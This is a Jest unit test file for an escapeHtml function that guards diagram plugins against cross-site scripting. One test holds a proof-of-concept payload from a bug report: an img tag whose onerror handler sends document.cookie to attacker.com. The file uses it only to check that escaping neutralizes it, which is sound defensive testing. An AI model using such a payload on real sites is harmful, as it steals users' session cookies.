/**
 * Unit tests for escapeHtml — the escaping primitive used at every diagram
 * plugin's error-display and source-view innerHTML sinks (PenPal #160,
 * CWE-79). Also covers the boundary the fix depends on: escaping must be
 * idempotent-safe against already-escaped input reaching a sink twice,
 * and must neutralize the exact PoC payload from the report.
 */

import { escapeHtml } from '../htmlSanitize';

describe('escapeHtml', () => {
    it('escapes angle brackets', () => {
        expect(escapeHtml('<img>')).toBe('&lt;img&gt;');
    });

    it('escapes ampersands', () => {
        expect(escapeHtml('a & b')).toBe('a &amp; b');
    });

    it('escapes double quotes', () => {
        expect(escapeHtml('say "hi"')).toBe('say &quot;hi&quot;');
    });

    it('leaves single quotes unescaped by design', () => {
        expect(escapeHtml("it's fine")).toBe("it's fine");
    });

    it('escapes ampersand before other entities so escaping is not double-applied', () => {
        // If '&' were escaped after '<', "&lt;" would become "&amp;lt;".
        expect(escapeHtml('<')).toBe('&lt;');
    });

    it('neutralizes the exact PoC payload from the report', () => {
        const payload = '<img src=x onerror=fetch(\'https://attacker.com/?c=\'+document.cookie)>';
        const escaped = escapeHtml(payload);
        expect(escaped).not.toContain('<img');
        expect(escaped).not.toMatch(/<[a-z]/i);
        expect(escaped).toContain('&lt;img');
    });

    it('handles empty string', () => {
        expect(escapeHtml('')).toBe('');
    });

    it('leaves plain text with no special characters unchanged', () => {
        expect(escapeHtml('digraph G { A B }')).toBe('digraph G { A B }');
    });

    it('escapes the ">" in an arrow-style diagram edge (correct, expected behavior)', () => {
        // A diagram body containing "->" legitimately contains a '>' that
        // must be escaped when interpolated into innerHTML — this is not
        // a false positive, it's exactly what protects against a crafted
        // "<img>" tag hiding inside otherwise-plausible diagram syntax.
        expect(escapeHtml('digraph G { A -> B }')).toBe('digraph G { A -&gt; B }');
    });
});
